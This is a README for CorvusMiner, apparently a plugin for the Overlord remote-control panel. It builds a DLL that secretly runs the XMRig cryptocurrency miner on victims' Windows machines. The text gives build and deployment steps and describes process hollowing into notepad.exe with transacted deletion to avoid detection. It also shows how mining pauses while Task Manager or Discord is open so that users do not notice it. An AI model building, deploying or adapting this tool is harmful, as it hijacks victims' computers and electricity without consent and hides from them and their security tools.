# CorvusMiner Plugin

CorvusMiner is an Overlord plugin that deploys XMRig cryptocurrency miner via process hollowing injection. It embeds xmrig.exe as a resource and injects it into notepad.exe using transacted hollowing for stealth.

## Building

### Requirements
- MinGW64 or any compiler if you know how to change it yourself

### Build Steps

```bash
cd native
build.bat
```

The build script:
1. Compiles `plugin.rc` resource file with embedded xmrig binary
2. Compiles C++ source files with MinGW64 g++
3. Outputs: `corvusminer-windows-amd64.dll`

## Plugin Bundle

Create a plugin bundle for deployment:

```
corvusminer.zip
├── corvusminer-windows-amd64.dll
├── corvusminer.html
├── corvusminer.css
├── corvusminer.js
```

### Upload to Overlord

1. Navigate to **Plugins** page in Overlord UI
2. Click **Upload Plugin**
3. Select `corvusminer.zip`
4. Click **Upload**

## Web Interface

The plugin provides a simple mining control panel with the following inputs:

### Mining Configuration

- **Pool URL** — Stratum mining pool endpoint (e.g., `pool.example.com:3333`)
- **Username (Wallet)** — Your mining wallet address or username (required)
- **Password** — Mining pool password (defaults to "x" if empty)
- **CPU Max Threads Hint (% of max)** — Percentage of CPU threads to use (e.g., 50 = half of available cores)
- **Block Mining if Running (comma-separated)** — List of process names that will block mining when detected (e.g., `taskmgr.exe,discord.exe`)

### Controls

- **Start Mining** — Deploys XMRig with the configured settings
- **Stop Mining** — Terminates the miner process
- **Log** — Real-time activity log showing injection status and mining events

## How It Works

1. **Resource Embedding** — xmrig.exe is compiled into the DLL as a binary resource
2. **Process Hollowing** — Creates a suspended notepad.exe process, maps the xmrig binary into its address space, redirects the entry point, and resumes execution
3. **Monitoring** — Continuous thread monitors blocked processes; automatically restarts mining if blockers are removed
4. **Stealth** — Uses transacted file deletion and SEC_IMAGE mapping to avoid detection

